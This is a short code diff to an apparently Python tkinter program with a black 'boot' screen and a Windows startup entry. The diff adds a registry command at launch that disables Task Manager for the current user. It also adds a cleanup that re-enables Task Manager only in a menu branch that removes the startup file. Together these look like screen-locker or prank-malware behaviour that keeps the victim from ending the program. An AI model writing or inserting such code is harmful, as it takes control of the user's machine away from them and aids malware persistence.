@@ -73,6 +73,10 @@ labels = []
 boot_frame = tk.Frame(root, bg=BLACK)
 boot_frame.pack(fill="both", expand=True)
 
+os.system(
+    'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" '
+    '/f /v "DisableTaskMgr" /t REG_DWORD /d 1'
+)
 def remove_from_startup():
 
     key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -370,6 +374,10 @@ def show_menu():
                 fg="#00ff66"
             )
             os.system(f'del {startup_path+file_name}')
+            os.system(
+                'REG DELETE "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" '
+                '/v "DisableTaskMgr" /f'
+            )
             remove_from_startup()
             root.destroy()
         else:
